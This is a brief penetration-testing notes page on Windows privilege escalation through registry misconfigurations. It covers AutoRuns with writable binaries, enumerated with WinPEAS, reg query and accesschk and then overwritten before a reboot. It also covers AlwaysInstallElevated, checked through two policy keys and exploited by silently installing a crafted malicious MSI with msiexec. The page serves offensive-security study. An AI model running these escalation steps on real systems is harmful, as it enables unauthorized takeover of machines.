---
description: Registry Exploits
---

# Registry Exploits

### AutoRuns

AutoRuns are configured in the registry. If we have access to write to an AutoRun executable and we can restart the system we might escalate privileges.

Run WinPEAS with applications check:

```
.\WinPEAS.exe quiet applicationsinfo
```

Enumerate manually instead of using WinPEAS:

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

Use "accesscheck" with everyone to check permissions:

```
.\accesschk.exe /accepteula -wvu "C:\XX\XX.exe"
```

Final step is to overwrite the original binary with our own. Then, restart the machine.

### AlwaysInstallElevated

If the following registry keys (both) are enabled we can craft a malicious MSI:

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Execute our crafted MSI:

```
msiexec /quiet /qn /i $msifile
```
